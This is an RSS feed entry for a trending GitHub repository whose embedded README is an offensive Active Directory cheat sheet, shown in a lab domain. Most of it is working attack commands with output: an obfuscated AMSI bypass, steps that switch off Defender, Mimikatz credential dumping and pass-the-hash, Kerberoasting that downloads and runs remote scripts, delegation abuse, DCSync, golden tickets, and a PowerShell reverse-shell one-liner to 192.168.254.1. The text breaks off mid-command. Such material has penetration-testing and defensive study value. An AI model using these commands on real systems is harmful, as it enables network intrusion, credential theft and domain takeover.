<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-05-19T01:42:48Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>punishell/ADCheatSheet</title>
    <updated>2023-05-19T01:42:48Z</updated>
    <id>tag:github.com,2023-05-19:/punishell/ADCheatSheet</id>
    <link href="https://github.com/punishell/ADCheatSheet" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Active Directory Cheat Sheet&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Active Directory Cheat Sheet&lt;/h1&gt; &#xA;&lt;p&gt;Domain Demolition with Frank Castle and Powershell.&lt;br&gt; &lt;img src=&#34;https://raw.githubusercontent.com/punishell/ADCheatSheet/master/FrankCastle.png&#34; alt=&#34;Frank&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Basic Domain Enumeration&lt;/h2&gt; &#xA;&lt;p&gt;Gathering information using Powerview.ps1:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; Get-NetDomain&#xA;&#xA;&#xA;Forest                  : marvel.local&#xA;DomainControllers       : {DC1.us.marvel.local}&#xA;Children                : {}&#xA;DomainMode              : Unknown&#xA;DomainModeLevel         : 7&#xA;Parent                  : marvel.local&#xA;PdcRoleOwner            : DC1.us.marvel.local&#xA;RidRoleOwner            : DC1.us.marvel.local&#xA;InfrastructureRoleOwner : DC1.us.marvel.local&#xA;Name                    : us.marvel.local&#xA;&#xA;PS C:\ad&amp;gt; Get-NetDomainTrust -Domain marvel.local&#xA;&#xA;SourceName    TargetName         TrustType TrustDirection&#xA;----------    ----------         --------- --------------&#xA;marvel.local us.marvel.local ParentChild  Bidirectional&#xA;&#xA;&#xA;PS C:\ad&amp;gt; Get-NetForestTrust&#xA;&#xA;&#xA;TopLevelNames            : {disney.local}&#xA;ExcludedTopLevelNames    : {}&#xA;TrustedDomainInformation : {disney.local}&#xA;SourceName               : marvel.local&#xA;TargetName               : disney.local&#xA;TrustType                : Forest&#xA;TrustDirection           : Bidirectional&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In order to find machines inside the trust, we need to specify the domain:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; (Get-DomainComputer -Domain disney.local).name&#xA;DS-DC1&#xA;DS-DBREPORT&#xA;DS-ITSTAFF&#xA;DS-MICKEY&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Lateral movement:&lt;/h2&gt; &#xA;&lt;h3&gt;with Powershell:&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; New-PSSession -ComputerName HYDRA&#xA;&#xA; Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability&#xA; -- ----            ------------    ------------    -----         -----------------     ------------&#xA;  1 WinRM1          HYDRA           RemoteMachine   Opened        Microsoft.PowerShell     Available&#xA;&#xA;&#xA;PS C:\Windows\system32&amp;gt; Enter-PSSession -ComputerName HYDRA&#xA;[HYDRA]: PS C:\Users\Administrator\Documents&amp;gt; whoami&#xA;marvel\administrator&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;[HYDRA]: PS C:\Users\Administrator\Documents&amp;gt; exit&#xA;PS C:\Windows\system32&amp;gt; invoke-command -ScriptBlock {whoami;hostname} -Computername HYDRA&#xA;marvel\administrator&#xA;HYDRA&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Invoking command on another machine:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Windows\system32&amp;gt; $sess = New-PSSession -ComputerName HYDRA    &#xA;PS C:\Windows\system32&amp;gt; invoke-Command -ScriptBlock {whoami} -Session $sess&#xA;marvel\administrator&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get Computers list that curent user has access to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)&#xA;foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get Computers list that target user has access to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$Username = &#39;domain\user&#39;&#xA;$Password = ConvertTo-SecureString -AsPlainText &#39;password&#39;-Force&#xA;&#xA;$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password&#xA;&#xA;$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)&#xA;&#xA;foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get SQL instances that current user has access to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded &#xA;&#xA;ComputerName                Instance                         Status&#xA;------------                --------                         ------&#xA;UFC-SQLDev.marvel.local    SQLDev.marvel.local,1433          Accessible&#xA;UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Local Privileges Escalation&lt;/h2&gt; &#xA;&lt;h3&gt;Basic Enumeration:&lt;/h3&gt; &#xA;&lt;p&gt;Automated Enumeration with PowerUp.ps1:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt;. .\PowerUp.ps1&#xA;PS C:\&amp;gt;Invoke-AllChecks &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Looking for weak ACL on Services:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;accesschk64.exe -uwcqv &#34;domain\user&#34; *&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;AV and AMSI Evasion:&lt;/h3&gt; &#xA;&lt;p&gt;To bypass AMSI and Defender, there is a possibility to turn them off with Local Administrator privileges:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Set-MpPreference -DisableIOAVProtection $true&#xA;Set-MpPreference -DisableRealtimeMonitoring $true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Bypass CLM with Local Admin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Remove-ItemProperty -path &#34;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\&#34; -name __PSLockdownPolicy&#xA;PsExec64.exe -i -s C:\Users\fcastle\Desktop\powershell.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Bypass CLM without Local Admin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Powershell -version 2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Bypass Amsi without Local Admin&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;SET-ItEM ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + &#39;blE:1q2&#39; + &#39;uZx&#39; ) ( [TYpE](&#34;{1}{0}&#34;-F&#39;F&#39;,&#39;rE&#39; ) ) ; ( GeT-VariaBle ( &#34;1Q2U&#34; +&#34;zX&#34; ) -VaL).&#34;A`ss`Embly&#34;.&#34;GET`TY`Pe&#34;(( &#34;{6}{3}{1}{4}{2}{0}{5}&#34; -f&#39;Util&#39;,&#39;A&#39;,&#39;Amsi&#39;,&#39;.Management.&#39;,&#39;utomation.&#39;,&#39;s&#39;,&#39;System&#39; )).&#34;g`etf`iElD&#34;( ( &#34;{0}{2}{1}&#34; -f&#39;amsi&#39;,&#39;d&#39;,&#39;InitFaile&#39; ),(&#34;{2}{4}{0}{1}{3}&#34; -f &#39;Stat&#39;,&#39;i&#39;,&#39;NonPubli&#39;,&#39;c&#39;,&#39;c,&#39; )).&#34;sE`T`VaLUE&#34;(${n`ULl},${t`RuE} )&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Check Applocker RuleCollections&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\fcastle\AppData\Local\Temp&amp;gt; (Get-AppLockerPolicy -Local).RuleCollections&#xA;PathConditions      : {C:\Users\fcastle\AppData\Local\Temp\*}&#xA;PathExceptions      : {}&#xA;PublisherExceptions : {}&#xA;HashExceptions      : {}&#xA;Id                  : 7e918348-5822-2e6e-b4a5-965db95efcfb&#xA;Name                : C:\Users\fcastle\AppData\Local\Temp\*&#xA;Description         :&#xA;UserOrGroupSid      : S-1-1-0&#xA;Action              : Allow&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Geting hashes with Mimikatz&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;invoke-mimikatz -dumpcred &#xA;invoke-mimikatz -command &#39;privilege::debug token::elevate lsadump::sam&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Passing hashes with Mimikatz&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -command &#39;&#34;sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe&#34;&#39; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Domain Privilege Escalation&lt;/h2&gt; &#xA;&lt;h3&gt;Looking for weak ACL in domain&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-ACLScanner | Where-Object {$_.IdentityReference â€“eq $userName}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Looking for hidden GPO:&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS&amp;gt;(([adsisearcher]&#39;&#39;).SearchRooT).Path | %{if(([ADSI]&#34;$_&#34;).gPlink){Write-Host &#34;[+] Domain Path:&#34;([ADSI]&#34;$_&#34;).Path;$a=((([ADSI]&#34;$_&#34;).gplink) -replace &#34;[[;]&#34; -split &#34;]&#34;);for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host &#34;Policy Path[$i]:&#34;([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host &#34;Policy Name[$i]:&#34;([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output &#34;`n&#34; }}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Kerberoasting&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\pparker&amp;gt; IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts&#39;); Find-PSServiceAccounts&#xA;Discovering service account SPNs in the AD Domain marvel.local&#xA;&#xA;&#xA;Domain                : marvel.local&#xA;UserID                : krbtgt&#xA;PasswordLastSet       : 12/30/2019 11:58:57&#xA;LastLogon             : 01/01/1601 00:00:00&#xA;Description           : Key Distribution Center Service Account&#xA;SPNServers            :&#xA;SPNTypes              : {kadmin}&#xA;ServicePrincipalNames : {kadmin/changepw}&#xA;&#xA;Domain                : marvel.local&#xA;UserID                : spn1&#xA;PasswordLastSet       : 01/07/2020 08:31:28&#xA;LastLogon             : 01/01/1601 00:00:00&#xA;Description           :&#xA;SPNServers            : {hydra.marvel.local}&#xA;SPNTypes              : {http}&#xA;ServicePrincipalNames : {http/hydra.marvel.local:80}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Performing the attack:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\Users\pparker&amp;gt; IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;) ; Invoke-Kerberoast&#xA;&#xA;TicketByteHexStream  :&#xA;Hash                 : $krb5tgs$http/hydra.marvel.local:80:38E8FD090742C0D1FFA26A56527F2A3F$71AF4E87BBE558A3B1C654A39942586DDD8D1A101E5097113E0F449D0EF39A4FA8BC2778B87CED04DDBDA5D79AA9ED374B08957185B1B636606124127EC6CE9D93A544B0C9B416CCAED7E003ABF5E2FA9EF646279EEAF0F55F&#xA;                       B110B3C03B7568DF1A288A627CC5801E425D2F1262A7AB042B67485B08C999CC9DA53414CE7515BDCE4ACD0BB7BAC1372A31B56BB7DC6BD94B553F1375728A9BA3CC0D73786EDF13C7976699289B56EC5ED045E4EFA1024783A0B6B36FC187C344BE3E499C9394BF4B3A8EF15D525A8EBC9C11711DC21A4B33D0575&#xA;                       2A0B68AF9339C70D3E8F4B8655A9D37C2E9266075F4BA7D449906E0F587CE3A3B8E8E97A44CA8474E91A468C613EA49D12DCE88C1753DF61536C22E3E060FB30EA2CAD0E58ED0412E4DFCF5BB46E2DBE5F174335B2440EBBB2CC6D28F6C3E691B6EA94B031991F29872D77C387CE5644ECBF70C6C2049319BC64B3A&#xA;                       806E0A813A58A9DFC96818CFC7A1B4BB36841E3EADD366ED20F6D90105369F83607FEC5B71F7A9318E0D8CC02E2B03AC271ED4178CEC0FEBF2FCD4DCD0168204AD1A69D2995EB2820F78AF329FEBAE1BB35910C5F968F702E243FBC5AD7297A40D1B0E1A157D73B05773AE46D2E40FC71DA10FADA7C68DE9B24B211&#xA;                       C35F73A888BE0E85F4EB451ABB411D6777DA560B3AC28778ACB5C34695F46A32AEA468FE901EFD6EE056D6B22D7A2BC202BF4305D5481F58368DE48E3CA770E154C982D742C133037D524795CD2FD737E9684247C8D00143E82902DF5445E83CE13699E18B51C1C4AED791A643659A490F72F2AA532244057458E3F&#xA;                       FEE303A5BEE0858CF6665DCDAD398D7D7ECBBEACBBA4AA96AFC0170AFE01DA2FC651D7D0EA31D00035FCC841ADA4C98B41E1732A4F1A5C663621AF348E47A9F0879254B13F74284905946D5D4ACA752359F9DD492238275D9BB1EED8A4FB78A2DF517BA65C8AD88BFBBFA3855752FBABC9F15F62FD54AE83B25A82A&#xA;                       0BDD406F68282D9C57EDA34946BD05276326CF67FE419DD5E7808167B0B92836AADDB8AE1672CC9D65A5F8C7B612C1E443BE80617DC88FC7DE81653807E08C6F8793B6D06773F202F93245DAAC271092A7C3D338D834E3CA7A9FA6A8EABD0E1639ED751BF096EE7B4D2D2D8EB137C78B2EC69006CE77E7B7AD97A52&#xA;                       6DBA146E38E2FDE820DDC2DFCEBCD8BD8E767F3B1B5D803E21F59F946934A191F7691441520515A3B2E330CCA07B07B92E210CC14C7EE41C9FCFBF222AF85DFF868786EBFE5D7F445EA26A6CDF3D5D7E174F4B11F13D202BC776237A343460FF204F9882DF372636515C794F56BC117B75F4BE90B2726B49D92B88C&#xA;                       74A9FFC7DF6C261E6245106D07AFF7F0B58B3FD77AF25FEF347075D0D1473C32FEC8D55AEC2CA21DE987537B9AFA8458848396269137DAA9FA36D00A2DC33D1C3FD6B1B1AAFFC576F85AD111E1FA818108EDA6D38&#xA;SamAccountName       : spn1&#xA;DistinguishedName    : CN=spn1,CN=Users,DC=marvel,DC=local&#xA;ServicePrincipalName : http/hydra.marvel.local:80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In order to crack Kerberos 5 TGS-REP etype 23 hash, use hashcat: &lt;code&gt;hashcat64.exe -m 13100 hash.txt rockyou.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Watchdog: Temperature abort trigger set to 90c&#xA;&#xA;Dictionary cache hit:&#xA;* Filename..: rockyou.txt&#xA;* Passwords.: 14344384&#xA;* Bytes.....: 139921497&#xA;* Keyspace..: 14344384&#xA;&#xA;$krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.local:80*$14734c7868bb6cc9d5abdf4e6ce271b8$5c3c9febdf1842ad23d347f442fe0520176275b43fc383950fc138a661a8208ecf89c692c733231a7d441704ca913ebfa98d30eb54cfc48b49b815459c62faa6e05b76d996ca5a87632c354696c619c4c8f3c8f64d5e2c59fc375d6319597996192fc421919ed47e1717cb0e955268bd58361eecf806dc8596f28d106922703b9a2d6350d82883e7c64e3b60987ec5f43e28149d0f8a71be2f16993d6f0b1300f1139c4d1824b783660f1042a5afb0080ecf1eab130a76bd24ea3a4a5ea0037cb510cf99fce2c8c20b997188f0b47b50132c2fc190d465b87d7d4c5d56c0abe3710b8cc1dd775bc017917803d63c8ae43d2c944e31280a6fa6095d095fc18d8ab77dc9514214cfe6af299efb490195524c27a4809df215b7b0afd6027ac8d64563b6d67b069f0d026c1be06ea76eca7d2c0a3733ce1e2f18b8ab7404c2e90a83be3e604bf8e1b3d313ddf1bc3dd8d0e3080d59b99793435bce2be0d182273418036f338bb6a567246bd625429691d6084f5f46160226b535836b12f080e00685968ed65f9c948fac3ca9f5dc63b58534de0035cd9c4b82b80e3aa5399aeb43a91f893356106c8f9a2c89293d1c3638d953ddc0ed71b7b245715bbf5dde2c4cef56d00eee02a5bd7c2b3938bb6eecd257e465196044a09cc92f22f4d00bcdf5409784b0bbaf137b14439b60d5badc26984d41917e944193f0ef58fab00abe0cd667d239770245f3ce624fecd57702b33b24ff32945f987354f5aa5b8b5fe514bd691be4335222004112d76eab7d8fda3e1b7e53376a1da3a0e7fc58bff4f8d4f2fb7eb09a07420e09d7881fbdddf962f9da98a5dbeb0b1ab8d8fcddeda5efc85df3f8caced853ee4cdf3680d52a289ee8b85d9410793b7ef2b0bf86f3ce00d80daf0c6904a496f95928a4ea523af30df29613bab42052ae2221103ec1c86b46aca95bbd97377024077be9b6bba68ea62055cedcfc8e2fb26e69996653a06b837900bc2a4cbc817f1b18a0bbd3ce6068a94474fc7dc9a0fce3d9ae667190d072501ce0b8c92460f189766f04fd6fab6a45e8de08d40a7d6c3a96a05b3cdc058473a1e28deeffd574914d86dca3180a030c1d6e40074958ad535a0d3759276412e070aa987d7bc84e72dbb72c41f8f0f3ae221ad2f76d8740538e375a43cde2e6b1394aca0840db94836f72ed1703e1e11b81c51dbe3710e8768d4d05073f042c996e6b338fec59b5f9891163aa09913e346c2423f44dea091152f47969c74434b971cc8d87f021739451fb27a0ffe343e6f36dacda5053d93ea6be7ea95d386bb027bde4b73738603796a9c72c3588e592f994216403340443597ac68e533c274138e1d8d121e6e9f645fa35f10adc33a558dd1bd2e9ea1c0181b971cfb571c76bad6d40d062a1a63951d62c2fcca87740fc0fbe6a502e2e4ddd7d8e8c556e7b70479c5d8ca2af021c84d007e0ce95:Password123&#xA;&#xA;Session..........: hashcat&#xA;Status...........: Cracked&#xA;Hash.Type........: Kerberos 5 TGS-REP etype 23&#xA;Hash.Target......: $krb5tgs$23$*spn1$marvel.local$http/hydra.marvel.lo...e0ce95&#xA;Time.Started.....: Tue Jan 07 10:12:14 2020 (0 secs)&#xA;Time.Estimated...: Tue Jan 07 10:12:14 2020 (0 secs)&#xA;Guess.Base.......: File (rockyou.txt)&#xA;Guess.Queue......: 1/1 (100.00%)&#xA;Speed.#1.........: 42526.0 kH/s (8.75ms) @ Accel:512 Loops:1 Thr:64 Vec:1&#xA;Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts&#xA;Progress.........: 983040/14344384 (6.85%)&#xA;Rejected.........: 0/983040 (0.00%)&#xA;Restore.Point....: 0/14344384 (0.00%)&#xA;Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1&#xA;Candidates.#1....: 123456 -&amp;gt; computer?&#xA;Hardware.Mon.#1..: Temp: 47c Util:  4% Core: 960MHz Mem:6801MHz Bus:16&#xA;&#xA;Started: Tue Jan 07 10:12:06 2020&#xA;Stopped: Tue Jan 07 10:12:19 2020&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Unconstrained Delegation&lt;/h3&gt; &#xA;&lt;p&gt;Looking for machines that allow unconstrained delegation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; (Get-DomainComputer -Unconstrained).cn &#xA;MVU-DC1&#xA;MVU-PROD&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In order to perform the attack, MVU-PROD should be compromised and following command needs to be executed:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz â€“Command &#39;&#34;sekurlsa::tickets /export&#34;&#39;&#xA;Invoke-Mimikatz â€“Command &#39;&#34;kerberos::ptt C:\ad\SOMEUSER.kirbi&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Constrained Delegation&lt;/h3&gt; &#xA;&lt;p&gt;Looking for machines that allow constrained delegation:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; (Get-DomainComputer -TrustedToAuth).cn &#xA;MVU-DB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Looking for object allowed to be delegated:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad\ADModule-master&amp;gt; Import-Module .\Microsoft.ActiveDirectory.Management.dll&#xA;PS C:\ad\ADModule-master&amp;gt; Get-ADObject  -Filter {msDS-AllowedToDelegateTo -ne &#34;$null&#34;}&#xA;&#xA;&#xA;DistinguishedName  : CN=someservice,CN=Users,DC=us,DC=marvel,DC=local&#xA;Name               : someservice&#xA;ObjectClass        : user&#xA;ObjectGuid         : 8612bef0-c62b-47d9-9085-b11e5ea71b1b&#xA;PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}&#xA;AddedProperties    : {}&#xA;RemovedProperties  : {}&#xA;ModifiedProperties : {}&#xA;PropertyCount      : 4&#xA;&#xA;DistinguishedName  : CN=UFC-DB1,OU=Servers,DC=us,DC=marvel,DC=local&#xA;Name               : MVU-DB1&#xA;ObjectClass        : computer&#xA;ObjectGuid         : 3e68b455-f55a-443e-b227-2e833e7caedb&#xA;PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}&#xA;AddedProperties    : {}&#xA;RemovedProperties  : {}&#xA;ModifiedProperties : {}&#xA;PropertyCount      : 4&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Preconditions: MVU-DB1 Compromised, NTLM Hashes dumped, Kekeo.exe and Mimikatz:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; kekeo.exe &#34;tgt::ask /user:someservice /domain:us.marvel.local /ntlm:${NTLM}&#34;&#xA;&#xA;PS C:\ad&amp;gt;  kekeo.exe &#34;tgs::s4u /tgt:TGT_someservice@US.MARVEL.LOCAL_krbtgt~us.marvel.local@US.MARVEL.LOCAL.kirbi /user:Administrator@us.marvel.local /service:time/MVU-DC1.us.marvel.local|ldap/MVY-DC1.us.marvel.local&#xA;&#xA;Invoke-Mimikatz -Command &#39;&#34;kerberos::ptt TGS_Administrator@us.marvel.local@US.MARVEL.LOCAL_ldap~UFC-DC1.us.marvel.local@US.MARVEL.LOCAL_ALT.kirbi&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;SQL Server Escalation&lt;/h3&gt; &#xA;&lt;h4&gt;Impersonate SQL User&lt;/h4&gt; &#xA;&lt;p&gt;Check impersonation possibilities:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Get-SQLQuery -Instance $instance -Verbose -Query &#34;select distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;&#34;&#xA;VERBOSE: MVU-SQL.us.marvel.local : Connection Success.&#xA;&#xA;name&#xA;----&#xA;sa&#xA;dbuser&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Check impersonation possibilitie using PowerUpSQL:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-SQLAuditPrivImpersonate -Username $username -Password $password -Instance MVU-SQL.us.marvel.local -Verbose&#xA;VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN&#xA;VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.&#xA;VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.&#xA;VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Impersonate using PowerUpSQL&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-SQLAuditPrivImpersonateLogin -Instance $instance -Verbose -Exploit&#xA;VERBOSE: MVU-SQL.us.marvel.local  : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN&#xA;VERBOSE: MVU-SQL.us.marvel.local  : CONNECTION SUCCESS.&#xA;VERBOSE: MVU-SQL.us.marvel.local  : - Logins can be impersonated.&#xA;VERBOSE: MVU-SQL.us.marvel.local  : - dbuser can impersonate the sa sysadmin login.&#xA;VERBOSE: MVU-SQL.us.marvel.local  : - EXPLOITING: Starting exploit process...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Impersonate Manualy&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;EXECUTE AS LOGIN = &#39;dbadmin&#39;&#xA;EXECUTE AS LOGIN = &#39;sa&#39;&#xA;SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Execute Command from SQL Server&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;EXECUTE as LOGIN = &#39;sa&#39;&#xA;EXEC sp_configure &#39;show advanced options&#39;, 1&#xA;RECONFIGURE&#xA;EXEC sp_configure &#39;xp_cmdshell&#39;,1&#xA;RECONFIGURE&#xA;EXEC master..xp_cmdshell &#39;whoami&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Persistence&lt;/h2&gt; &#xA;&lt;h3&gt;DC Sync&lt;/h3&gt; &#xA;&lt;p&gt;Preconditions Domain Administrator Privileges:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;invoke-mimikatz -Command &#39;&#34;lsadump::dcsync /user:marvel\Administrator&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;DCSync feature for getting krbtgt hash, which can be use to create golden tickes:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Invoke-Mimikatz -Command &#39;&#34;lsadump::dcsync /user:marvel\krbtgt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Escalation Across Domain Trust&lt;/h2&gt; &#xA;&lt;p&gt;Admin of child domain, krbtgt hash, access to DC&lt;/p&gt; &#xA;&lt;p&gt;Getting the &#34;sids&#34; of the parent domain:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; (New-Object System.Security.Principal.NTAccount(&#34;disney.local&#34;,&#34;krbtgt&#34;)).Translate([System.Security.Principal.SecurityIdentifier]).Value&#xA;S-1-5-21-493355955-4213530352-789496340-502&#xA;change 502 to 519&#xA;Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /domain:us.marvel.local /sid:{marvel-domain-sid} /sids:S-1-5-21-493355955-4213530352-789496340-519 /user:Administrator /krbtgt:$krbthash  /ticket:C:\Users\Administrator\Desktop\trust_tgt.kirbi&#34;&#39;&#xA;PS C:\ad&amp;gt; invoke-mimikatz -Command &#39;&#34;kerberos::ptt C:\Users\Administrator\Desktop\trust_tgt.kirbi&#34;&#39;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Misc&lt;/h2&gt; &#xA;&lt;h1&gt;Reverse Shell OneLiner&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.254.1&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2  = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&amp;gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Encode Command&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;PS C:\ad&amp;gt; invoke-encode -DataToEncode .\Invoke-ReverseTCPOneliner.ps1 -OutCommand&#xA;Encoded data written to .\encoded.txt&#xA;Encoded command written to .\encodedcommand.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;File Transfer&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ses = New=PsSesion -ComputerName HYDRA&#xA;Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt&#xA;&#xA;$ses = New=PsSesion -ComputerName HYDRA&#xA;Copy-Item -ToSession $ses -Path  